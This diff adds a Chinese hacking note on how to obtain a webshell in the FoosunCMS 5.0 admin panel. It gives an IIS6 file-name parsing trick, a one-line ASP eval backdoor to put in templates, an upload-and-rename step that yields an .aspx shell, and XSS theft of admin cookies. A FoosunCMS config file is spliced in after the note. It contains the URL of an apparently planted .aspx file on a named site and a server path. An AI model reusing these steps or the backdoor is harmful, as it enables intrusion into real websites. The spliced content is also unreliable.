@@ -1,0 +1,218 @@
+风讯最新5.0后台拿webshell方法2009-09-26 20:27遇到一个这样的站没拿下来后来叫朋友帮忙看了下
+
+没什么技术含量，但是当你要用的时候网上却找不到资料，那就比较郁闷
+
+图片上传处上传文件名为*.asp;*.jpg,记住选上不重命名文件，这是根据2k3，iis6.0解析漏洞
+
+但如果服务器不是2003，可以选择编辑模板下的htm或css文件，记住一定要选择文本编辑，如果选择在线编辑,大于和小于号会过滤掉，插入<%eval request(“#")%>,保存后将文件名改成*.asp,这样就可以用一句话连接得到webshell
+ 
+
+4.登录网站后台，点击插件管理，在点击左边的文件管理，上传文件，上传webshell命名为XX.jpg,上传.OK，看到xx.jpg，右边操作栏->改名为XX.aspx，找到路径/files/xxx.aspx,直接得到webshell.漏洞明显设计逻辑有问题，不能直接上传aspx，但是可以间接的上传aspx.
+ok,下面来说下这几个漏洞的危害，单单这几个漏洞来说，都很鸡助，但是结合起来，威力不小，
+首先，利用XSS窃取管理员cookies，例如你可以在职业处构造XSS，当管理员查看你的资料就会泄露cookies等其他信息
+当你得到cookies。进入后台，上传webshell
+
+
+
+<%
+'++++++++++----------配置信息开始----------++++++++++
+'请不要轻易修改此文件
+'单引号"'"不能去掉
+'请不要使用回车符号
+'如果你对全局变量不了解，请详细查看软件附带的程序使用说明
+
+
+
+
+http://www.csxsyy.com//Files/UpLoadfiles/2011112817314555215.aspx
+
+
+
+F:\www.hndzkj.net\
+
+'-----系统的虚拟目录，后面不能带/，例如：F5，Test/F5
+Const G_VIRTUAL_ROOT_DIR		= ""
+
+'-----购物车模板路径{FS:Mall_Cart_Content}
+Const G_MALL_CART_TEMPLET       ="/Templets/Mall/Cart.html"
+
+'-----管理目录，后面不能带/，不带虚拟目录
+Const G_ADMIN_DIR				= "AdminMaster"
+
+'-----用户目录，后面不能带/，不带虚拟目录
+Const G_USER_DIR				= "User"
+
+'-----用户文件目录，后面不能带/，不带虚拟目录，例如：User，Test/User
+Const G_USERFILES_DIR			= "UserFiles"
+
+'-----上传文件目录，后面不能带/，不带虚拟目录
+Const G_UP_FILES_DIR			= "Files"
+
+'-----模板文件目录,后面不能带/,不带虚拟目录
+Const G_TEMPLETS_DIR			= "Templets"
+
+'-----控件加载配置目录名
+Const G_DBCONFIGFILE_DIR		= "DBConfigFiles" 
+
+'-----主系统是Sql数据库；1:SQL,0:ACCESS
+Const G_IS_SQL_DB				= "0"
+
+'-----主数据库,后面不能带/,不带虚拟目录
+Const G_DATABASE_CONN_STR		= "Fy_Data/CSXSYY20%#20110822#20%.asa"
+
+'-----会员系统是Sql数据库；1:SQL,0:ACCESS
+Const G_IS_SQL_User_DB			= "0"
+
+'-----会员数据库,后面不能带/,不带虚拟目录
+Const G_User_DATABASE_CONN_STR	= "Fy_Data/CSXSYY20%#20110822#20%_ME.asa"
+
+'-----采集系统是Sql数据库；1:SQL,0:ACCESS
+Const G_IS_SQL_COLLECT_DB		= "0"
+
+'-----采集数据库,后面不能带/,不带虚拟目录
+Const G_COLLECT_DATA_STR		= "Fy_Data/Collect.mdb"
+
+'-----设置一次读取的新闻数量，如果采集慢请设置小一点
+Const CollectMaxOfOnePage		= "8"
+
+'-----采集来的文件保存位置
+Const G_SAVE_FILE_PATH			= "File"
+
+'-----采集新闻列表分页最大数量
+Const G_NEWS_LIST_PAGES_NUMBER	= "300"
+
+'-----归档数据库类型，0为ACCESS数据库，1为SQL数据库
+Const G_IS_SQL_Old_News_DB		= "0"
+
+'-----归档数据库,后面不能带/,不能带虚拟目
+Const G_Old_News_DATABASE_CONN_STR	= "Fy_Data/OldNews.mdb"
+
+'-----归档模板地址,修改模板，请把相应的标签设定好
+Const G_OLD_TEMPLET_PATH			= "/Templets/OldNews/Index.htm"
+
+'-----IP地址库,请注意不要加虚拟目录
+Const G_IP_DATABASE_CONN_STR	= "Fy_Data/AddressIp.mdb"
+
+'-----登录日志、错误日志、操作日志保留天数，默认为7
+Const G_HOLD_LOG_DAY_NUM		= "7"
+
+'-----前台搜索模式,0为普通模式，1为带时间搜索
+Const G_SEARCH_TYPE				= "1"
+
+'-----发布数据多少条停一秒0为不停止
+Const G_REFRESH_NUM_TIME		= "0"
+
+'-----新闻自动分页字符数，为0则不分页 分页字符一个汉字算2个 分页字符数不包含Html标记
+Const G_FS_Page_Txtlength		= "3000"
+
+'-----系统版本信息 FoosunCMS 5.0
+Const G_COPYRIGHT				= "5.0"
+
+'安全密码参数设置，“0,3,4,2,0”；
+'作用：有人通过下载数据库或SQL注入得到了管理员的真正密码后，仍不能进入系统
+'第1位	是否启用安全密码 为0时则不启用 为1时启用
+'第2位	取验证码中的第几位参与运算，取1-4之间的数字
+'第3位	取验证码中的第几位参与运算，取1-4之间的数字
+'第4位	将取得的两位验证码作什么运算，1为加法运算；2为乘法运算
+'第5位	将得到的结果插入到密码的第几位后面
+'例如安全码参数设置为1，1，3，2，5  即为启用安全码，将验证码的第一位和第三位相乘的结果插入到密码的第五位后面
+'如果你登陆时 产生的验证码为3568 管理员密码为TryLogin
+'则你应该输入的密码为TryLo18gin
+'如果开启了验证码中有随机字母，请不要使用此功能
+Const G_SAFE_PASS_SET_STR		= "0,1,2,2,0"
+'Session超时,1为永不过期，0为10分钟过期
+Const G_SESSION_TIME_OUT		= "1"
+
+'脚本超时
+Const G_SERVER_SCRIPT_TIME_OUT	= "600"
+
+'系统登陆安全是否验证到数据库中,0不验证到数据库中，1验证到数据库中
+Const G_SESSION_GETDATA			= "0"
+
+'新闻刷新频率
+'第一参数：表示多少秒刷新一次，第二个参数代表每次刷新多少个记录
+Const G_REFRESH_SPEED			= "1,5"
+
+'服务器组件变量开始
+
+'Adodb.Connection；
+Const G_FS_CONN		= "Adodb.Connection"
+
+'Scripting.FileSystemObject；
+Const G_FS_FSO		= "Scripting.FileSystemObject"
+
+'Adodb.RecordSet；
+Const G_FS_RS		= "Adodb.RecordSet"
+
+'Adodb.Stream；
+Const G_FS_STREAM	= "Adodb.Stream"
+
+'Scripting.Dictionary；
+Const G_FS_DICT		= "Scripting.Dictionary"
+
+'Microsoft.XMLHTTP；
+Const G_FS_HTTP		= "Microsoft.XMLHTTP"
+
+'MSXML2.XMLHTTP
+Const G_FS_XMLHTTP	= "MSXML2.XMLHTTP"
+
+'MSXML2.ServerXMLHTTP
+Const G_MSXML2_SERVERXMLHTTP	= "MSXML2.ServerXMLHTTP"
+
+'msxml2.FreeThreadedDOMDocument
+Const G_MSXML2_DOCUMENT	= "msxml2.FreeThreadedDOMDocument"
+
+'Excel.Application
+Const G_EXCEL_APPLICATION	= "Excel.Application"
+
+'CDONTS.NewMail
+Const G_CDONTS_NEWMAIL	= "CDONTS.NewMail"
+
+'CreatePreviewImage.cGvbox
+Const G_CREATEPREVIEW_CGVBOX	= "CreatePreviewImage.cGvbox"
+
+'SoftArtisans.ImageGen
+Const G_SOFTARTISANS_IMAGEGEN	= "SoftArtisans.ImageGen"
+
+'Persits.Jpeg
+Const G_PERSITS_JPEG	= "Persits.Jpeg"
+
+'wsImage.Resize
+Const G_WSIMAGE_RESIZE	= "wsImage.Resize"
+
+'MSWC.BrowserType
+Const G_MSWC_BROWSERTYPE	= "MSWC.BrowserType"
+
+'JMail.Message
+Const G_JMAIL_MESSAGE		= "JMail.Message"
+
+'WScript.Shell
+Const G_WSCRIPT_SHELL		= "WScript.Shell"
+
+'JRO.JetEngine
+Const G_JRO_JETENGINE		= "JRO.JetEngine"
+
+Const G_Badwords	= "我操|xx,妈的|yy,fuck|ff,NND|nn"
+'新闻标题后的新标志.格式：开启(1)还是关闭(0)|样式(1)还是图片(0)|CSS样式|多少天内的新闻显示标志。
+'如果是使用的CSS样式，需要对CSS里的a进行定义 如：news a{color:Red;}
+'如果是图片，请填写完整的图片地址，绝对路径或者相对路径。如：http://www.foosun.net/1.gif或/1.gif
+Const G_newNews		= "1|1|newNews|10"
+
+'代码画中画显示在新闻内容右边还是左边。只需要2个值。right或者left
+Const G_CodeContentAlign = "left"
+
+'新闻分页采用的样式，可选1，2，3，4，5,默认为4,分页样式参看制作标签中终极新闻列表分类。
+Const G_NEWSPAGESTYLE = "5"
+
+'导出的标签数据库连接。不带虚拟目录
+Const G_LABEL_DATA_STR		= "Fy_Data/label.mdb"
+
+'加入收藏图片地址,注意图片地址前方不能加"/"
+Const AddFavorite = "sys_images/icon_star_2.gif"
+
+'发送好友图片地址,注意图片地址前方不能加"/"
+
+Const SendFriend = "sys_images/sendmail.gif"
+
+'++++++++++----------配置信息结束----------++++++++++
+%>
